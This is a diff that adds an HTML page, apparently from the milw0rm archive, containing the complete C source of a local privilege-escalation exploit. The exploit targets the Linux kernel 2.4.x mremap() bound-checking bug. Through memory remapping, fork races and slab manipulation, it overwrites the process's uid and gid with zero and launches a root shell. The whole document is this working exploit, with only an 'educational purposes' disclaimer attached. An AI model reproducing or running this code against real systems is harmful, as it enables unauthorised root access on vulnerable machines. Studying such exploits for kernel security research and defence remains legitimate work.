@@ -1,0 +1,420 @@
+<html>
+<head>
+<title>Linux Kernel 2.4.x mremap() bound checking Root Exploit
+</title>
+<pre>
+/*
+ * Linux kernel mremap() bound checking bug exploit.
+ *
+ * Bug found by Paul Starzetz &lt;paul isec pl&gt;
+ *
+ * Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
+ *
+ * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot;
+ * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
+ * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;syscall.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;time.h&gt;
+#include &lt;sched.h&gt;
+
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/wait.h&gt;
+
+#include &lt;asm/page.h&gt;
+
+#define MREMAP_MAYMOVE	1
+#define MREMAP_FIXED	2
+
+#define str(s) 	#s
+#define xstr(s) str(s)
+
+#define DSIGNAL		SIGCHLD
+#define CLONEFL		(DSIGNAL|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VFORK)
+#define PAGEADDR	0x2000
+
+#define RNDINT		512
+
+#define NUMVMA		(3 * 5 * 257)
+#define NUMFORK		(17 * 65537)
+
+#define DUPTO		1000
+#define TMPLEN		256
+
+#define __NR_sys_mremap	163
+
+_syscall5(ulong, sys_mremap, ulong, a, ulong, b, ulong, c, ulong, d, ulong, e);
+unsigned long sys_mremap(unsigned long addr, unsigned long old_len, unsigned long
+new_len,
+			 unsigned long flags, unsigned long new_addr);
+
+
+static volatile int pid = 0, ppid, hpid, *victim, *fops, blah = 0, dummy = 0, uid,
+gid;
+static volatile int *vma_ro, *vma_rw, *tmp;
+static volatile unsigned fake_file[16];
+
+
+void fatal(const char * msg)
+{
+	printf(&quot;\n&quot;);
+	if (!errno) {
+		fprintf(stderr, &quot;FATAL: %s\n&quot;, msg);
+	} else {
+		perror(msg);
+	}
+
+	printf(&quot;\nentering endless loop&quot;);
+	fflush(stdout);
+	fflush(stderr);
+	while (1) pause();
+}
+
+void kernel_code(void * file, loff_t offset, int origin)
+{
+	int i, c;
+	int *v;
+
+	if (!file)
+		goto out;
+
+	__asm__(&quot;movl	%%esp, %0&quot; : : &quot;m&quot; (c));
+
+	c &amp;= 0xffffe000;
+	v = (void *) c;
+
+	for (i = 0; i &lt; PAGE_SIZE / sizeof(*v) - 1; i++) {
+		if (v[i] == uid &amp;&amp; v[i+1] == uid) {
+			i++; v[i++] = 0; v[i++] = 0; v[i++] = 0;
+		}
+		if (v[i] == gid) {
+			v[i++] = 0; v[i++] = 0; v[i++] = 0; v[i++] = 0;
+			break;
+		}
+	}
+out:
+	dummy++;
+}
+
+void try_to_exploit(void)
+{
+	int v = 0;
+
+	v += fops[0];
+	v += fake_file[0];
+
+	kernel_code(0, 0, v);
+	lseek(DUPTO, 0, SEEK_SET);
+
+	if (geteuid()) {
+		printf(&quot;\nFAILED uid!=0&quot;); fflush(stdout);
+		errno =- ENOSYS;
+		fatal(&quot;uid change&quot;);
+	}
+
+	printf(&quot;\n[+] PID %d GOT UID 0, enjoy!&quot;, getpid()); fflush(stdout);
+
+	kill(ppid, SIGUSR1);
+	setresuid(0, 0, 0);
+	sleep(1);
+
+	printf(&quot;\n\n&quot;); fflush(stdout);
+
+	execl(&quot;/bin/bash&quot;, &quot;bash&quot;, NULL);
+	fatal(&quot;burp&quot;);
+}
+
+void cleanup(int v)
+{
+	victim[DUPTO] = victim[0];
+	kill(0, SIGUSR2);
+}
+
+
+void redirect_filp(int v)
+{
+	printf(&quot;\n[!] parent check race... &quot;); fflush(stdout);
+
+	if (victim[DUPTO] &amp;&amp; victim[0] == victim[DUPTO]) {
+		printf(&quot;SUCCESS, cought SLAB page!&quot;); fflush(stdout);
+		victim[DUPTO] = (unsigned) &amp; fake_file;
+		signal(SIGUSR1, &amp;cleanup);
+		kill(pid, SIGUSR1);
+	} else {
+		printf(&quot;FAILED!&quot;);
+	}
+	fflush(stdout);
+}
+
+int get_slab_objs(void)
+{
+	FILE * fp;
+	int c, d, u = 0, a = 0;
+	static char line[TMPLEN], name[TMPLEN];
+
+	fp = fopen(&quot;/proc/slabinfo&quot;, &quot;r&quot;);
+	if (!fp)
+		fatal(&quot;fopen&quot;);
+
+	fgets(name, sizeof(name) - 1, fp);
+	do {
+		c = u = a =- 1;
+		if (!fgets(line, sizeof(line) - 1, fp))
+			break;
+c = sscanf(line, &quot;%s %u %u %u %u %u %u&quot;, name, &amp;u, &amp;a, &amp;d, &amp;d, &amp;d, &amp;d);
+	} while (strcmp(name, &quot;size-4096&quot;));
+	
+	fclose(fp);
+
+	return c == 7 ? a - u : -1;
+}
+
+void unprotect(int v)
+{
+	int n, c = 1;
+
+	*victim = 0;
+	printf(&quot;\n[+] parent unprotected PTE &quot;); fflush(stdout);
+
+	dup2(0, 2);
+	while (1) {
+		n = get_slab_objs();
+		if (n &lt; 0)
+			fatal(&quot;read slabinfo&quot;);
+		if (n &gt; 0) {
+			printf(&quot;\n    depopulate SLAB #%d&quot;, c++);
+			blah = 0; kill(hpid, SIGUSR1);
+			while (!blah) pause();
+		}
+		if (!n) {
+			blah = 0; kill(hpid, SIGUSR1);
+			while (!blah) pause();
+			dup2(0, DUPTO);
+			break;
+		}
+	}
+
+	signal(SIGUSR1, &amp;redirect_filp);
+	kill(pid, SIGUSR1);
+}
+
+void cleanup_vmas(void)
+{
+	int i = NUMVMA;
+
+	while (1) {
+		tmp = mmap((void *) (PAGEADDR - PAGE_SIZE), PAGE_SIZE, PROT_READ,
+				MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
+		if (tmp != (void *) (PAGEADDR - PAGE_SIZE)) {
+			printf(&quot;\n[-] ERROR unmapping %d&quot;, i); fflush(stdout);
+			fatal(&quot;unmap1&quot;);
+		}
+		i--;
+		if (!i)
+			break;
+
+	tmp = mmap((void *) (PAGEADDR - PAGE_SIZE), PAGE_SIZE, PROT_READ|PROT_WRITE,
+				MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+	if (tmp != (void *) (PAGEADDR - PAGE_SIZE)) {
+			printf(&quot;\n[-] ERROR unmapping %d&quot;, i); fflush(stdout);
+			fatal(&quot;unmap2&quot;);
+		}
+		i--;
+		if (!i)
+			break;
+	}
+}
+
+void catchme(int v)
+{
+	blah++;
+}
+
+void exitme(int v)
+{
+	_exit(0);
+}
+
+void childrip(int v)
+{
+	waitpid(-1, 0, WNOHANG);
+}
+
+void slab_helper(void)
+{
+	signal(SIGUSR1, &amp;catchme);
+	signal(SIGUSR2, &amp;exitme);
+	blah = 0;
+
+	while (1) {
+		while (!blah) pause();
+
+		blah = 0;
+		if (!fork()) {
+			dup2(0, DUPTO);
+			kill(getppid(), SIGUSR1);
+			while (1) pause();
+		} else {
+			while (!blah) pause();
+			blah = 0; kill(ppid, SIGUSR2);
+		}
+	}
+	exit(0);
+}
+
+int main(void)
+{
+	int i, r, v, cnt;
+	time_t start;
+
+	srand(time(NULL) + getpid());
+	ppid = getpid();
+	uid = getuid();
+	gid = getgid();
+
+	hpid = fork();
+	if (!hpid)
+		slab_helper();
+
+	fops = mmap(0, PAGE_SIZE, PROT_EXEC|PROT_READ|PROT_WRITE,
+			MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+	if (fops == MAP_FAILED)
+		fatal(&quot;mmap fops VMA&quot;);
+	for (i = 0; i &lt; PAGE_SIZE / sizeof(*fops); i++)
+		fops[i] = (unsigned)&amp;kernel_code;
+	for (i = 0; i &lt; sizeof(fake_file) / sizeof(*fake_file); i++)
+		fake_file[i] = (unsigned)fops;
+
+	vma_ro = mmap(0, PAGE_SIZE, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+	if (vma_ro == MAP_FAILED)
+		fatal(&quot;mmap1&quot;);
+
+	vma_rw = mmap(0, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+	if (vma_rw == MAP_FAILED)
+		fatal(&quot;mmap2&quot;);
+
+	cnt = NUMVMA;
+	while (1) {
+		r = sys_mremap((ulong)vma_ro, 0, 0, MREMAP_FIXED|MREMAP_MAYMOVE, PAGEADDR);
+		if (r == (-1)) {
+			printf(&quot;\n[-] ERROR remapping&quot;); fflush(stdout);
+			fatal(&quot;remap1&quot;);
+		}
+		cnt--;
+		if (!cnt) break;
+
+		r = sys_mremap((ulong)vma_rw, 0, 0, MREMAP_FIXED|MREMAP_MAYMOVE, PAGEADDR);
+		if (r == (-1)) {
+			printf(&quot;\n[-] ERROR remapping&quot;); fflush(stdout);
+			fatal(&quot;remap2&quot;);
+		}
+		cnt--;
+		if (!cnt) break;
+	}
+
+	victim = mmap((void*)PAGEADDR, PAGE_SIZE, PROT_EXEC|PROT_READ|PROT_WRITE,
+			MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+	if (victim != (void *) PAGEADDR)
+		fatal(&quot;mmap victim VMA&quot;);
+
+	v = *victim;
+	*victim = v + 1;
+
+	signal(SIGUSR1, &amp;unprotect);
+	signal(SIGUSR2, &amp;catchme);
+	signal(SIGCHLD, &amp;childrip);
+	printf(&quot;\n[+] Please wait...HEAVY SYSTEM LOAD!\n&quot;); fflush(stdout);
+	start = time(NULL);
+
+	cnt = NUMFORK;
+	v = 0;
+	while (1) {
+		cnt--;
+		v--;
+		dummy += *victim;
+
+		if (cnt &gt; 1) {
+			__asm__(
+			&quot;pusha				\n&quot;
+			&quot;movl %1, %%eax			\n&quot;
+			&quot;movl $(&quot;xstr(CLONEFL)&quot;), %%ebx	\n&quot;
+			&quot;movl %%esp, %%ecx		\n&quot;
+			&quot;movl $120, %%eax		\n&quot;
+			&quot;int  $0x80			\n&quot;
+			&quot;movl %%eax, %0			\n&quot;
+			&quot;popa				\n&quot;
+			: : &quot;m&quot; (pid), &quot;m&quot; (dummy)
+			);
+		} else {
+			pid = fork();
+		}
+
+		if (pid) {
+			if (v &lt;= 0 &amp;&amp; cnt &gt; 0) {
+				float eta, tm;
+				v = rand() % RNDINT / 2 + RNDINT / 2;
+				tm = eta = (float)(time(NULL) - start);
+				eta *= (float)NUMFORK;
+				eta /= (float)(NUMFORK - cnt);
+				printf(&quot;\r\t%u of %u [ %u %%  ETA %6.1f s ]          &quot;,
+				NUMFORK - cnt, NUMFORK, (100 * (NUMFORK - cnt)) / NUMFORK, eta - tm);
+				fflush(stdout);
+			}
+			if (cnt) {
+				waitpid(pid, 0, 0);
+				continue;
+			}
+			if (!cnt) {
+				while (1) {
+					 r = wait(NULL);
+					 if (r == pid) {
+					cleanup_vmas();
+					while (1) { kill(0, SIGUSR2); kill(0, SIGSTOP); pause(); }
+					 }
+				}
+			}
+		}
+
+		else {
+			cleanup_vmas();
+
+			if (cnt &gt; 0) {
+				_exit(0);
+			}
+
+		printf(&quot;\n[+] overflow done, the moment of truth...&quot;); fflush(stdout);
+			sleep(1);
+
+			signal(SIGUSR1, &amp;catchme);
+			munmap(0, PAGE_SIZE);
+			dup2(0, 2);
+			blah = 0; kill(ppid, SIGUSR1);
+			while (!blah) pause();
+
+			munmap((void *)victim, PAGE_SIZE);
+			dup2(0, DUPTO);
+
+			blah = 0; kill(ppid, SIGUSR1);
+			while (!blah) pause();
+			try_to_exploit();
+			while (1) pause();
+		}
+	}
+	return 0;
+}
+
+
+
+// milw0rm.com [2004-01-15]
+</pre>
+</html>
+
